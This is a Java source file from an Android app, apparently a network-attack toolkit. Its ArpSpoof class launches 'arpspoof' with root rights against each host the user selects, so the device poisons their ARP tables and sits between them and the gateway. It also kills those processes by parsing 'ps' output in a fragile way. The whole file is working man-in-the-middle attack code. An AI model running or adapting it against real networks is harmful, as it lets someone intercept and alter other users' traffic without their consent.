package fr.allycs.app.Controller.Core.Tools;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;

import fr.allycs.app.Controller.Core.Conf.Singleton;
import fr.allycs.app.Model.Target.Host;

public class                        ArpSpoof {
    private static final String     TAG = "ArpSpoof";
    private ArpSpoof                mInstance = this;
    private Host                    mTarget;
    private RootProcess             mProcess;

    private                         ArpSpoof(Host target) {
        this.mTarget = target;
    }

    public ArpSpoof                 start() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                mProcess = new RootProcess("ARPSPoof::" + mTarget.ip);
                mProcess.exec(Singleton.getInstance().BinaryPath + "arpspoof -i wlan0 -t " + mTarget.ip + " " + Singleton.getInstance().network.gateway);
                Singleton.getInstance().ArpSpoofProcessStack.add(mInstance);
                if (Singleton.getInstance().DebugMode) {
                    BufferedReader reader = mProcess.getReader();
                    String read;
                    try {
                        while ((read = reader.readLine()) != null) {
                            //Log.d(TAG, mTarget.ip + "::" + read);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
        return this;
    }

    public static void              stopArpSpoof() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                RootProcess process = new RootProcess("stopArpSpoof ARPSpoof");
                process.exec("ps | grep arpspoof");
                BufferedReader reader = new BufferedReader(process.getReader());
                String line;
                try {
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("arp") && Singleton.getInstance().UltraDebugMode)
                            Log.d(TAG, line);
                        String pidArpProcess = line.replace("  ", " ").split(" ")[3];
                        new RootProcess("ARPSpoof").exec("kill SIGINT " + pidArpProcess).closeProcess();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                process.closeProcess();

            }
        }).start();
    }
    public static void              launchArpSpoof() {
        for (Host host : Singleton.getInstance().hostsList) {
            if (host.selected) {
                new ArpSpoof(host).start();
            }
        }
    }
}